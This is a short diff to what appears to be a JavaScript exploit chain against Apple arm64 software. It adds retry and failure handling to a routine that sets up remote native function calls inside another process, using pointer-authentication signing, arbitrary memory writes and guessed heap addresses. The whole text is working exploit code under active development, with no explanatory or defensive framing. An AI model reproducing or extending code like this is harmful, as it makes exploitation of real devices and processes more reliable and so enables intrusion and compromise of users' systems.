@@ -6313,8 +6313,11 @@
         }
         if (!success) break;
         LOG(`surface_address_remote: ${surface_address_remote.hex()}`);
-        setup_nativefcall_fcall();
-        {
+        if (!setup_nativefcall_fcall()) {
+          LOG("[x] nativefcall setup failed, retrying endpoint");
+          services_idx = 0n;
+          success = false;
+        } else {
           LOG("[i] nativefcall setup done...");
           lazy_fcall("usleep", 5n * 1000n);
           mpd_fcall_noreturn(CALLOC, 0x100n, 1n, 0n, 0n, 0n, 0n, 0n, 0n);
@@ -6334,6 +6337,7 @@
             } else {
               LOG(`[!] calloc() crashed ${kr.hex()} !!! Probably wrong malloc_zones guess address !!!`);
               services_idx = 0n;
+              success = false;
               alive = false;
               break;
             }
@@ -6519,10 +6523,11 @@
         usleep(1n);
         if (Date.now() - init_start > 10000) {
           LOG("[x] setup_nativefcall_fcall timed out after 10s - remote process likely crashed");
-          return;
+          return false;
         }
       }
     }
+    return true;
   }
   function reset_nativefcall(surface, x0_remote) {
     uwrite64(surface_address, pacia(self_loop, 0n));
